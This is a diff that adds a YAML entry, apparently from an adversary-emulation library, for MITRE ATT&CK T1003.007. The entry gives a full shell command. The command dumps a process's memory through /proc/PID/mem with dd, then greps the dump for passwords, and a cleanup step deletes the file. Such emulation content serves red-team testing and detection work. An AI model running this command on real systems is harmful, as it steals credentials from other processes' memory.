@@ -1,0 +1,25 @@
+---
+- id: 0958e46ba7e89196e92a86651c397a77
+  name: Dump individual process memory with sh on FreeBSD (Local)
+  description: 'Using `/proc/$PID/mem`, where $PID is the target process ID, use shell
+    utilities to
+
+    copy process memory to an external file so it can be searched or exfiltrated later.
+
+    On FreeBSD procfs must be mounted.
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1003.007
+    name: 'OS Credential Dumping: Proc Filesystem'
+  platforms:
+    linux:
+      sh:
+        command: sh /tmp/T1003.007.sh; PID=$(pgrep -n -f "T1003.007"); MEM_START=$(head
+          -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f1); MEM_STOP=$(head -n 5
+          /proc/"${PID}"/map | tail -1 | cut -d' ' -f2); MEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)));
+          dd if=/proc/"${PID}"/mem of="/tmp/T1003.007.bin" ibs=1 skip="$MEM_START"
+          count="$MEM_SIZE"; strings "/tmp/T1003.007.bin" | grep -i PASS
+        payloads: []
+        cleanup: rm -f "/tmp/T1003.007.bin"
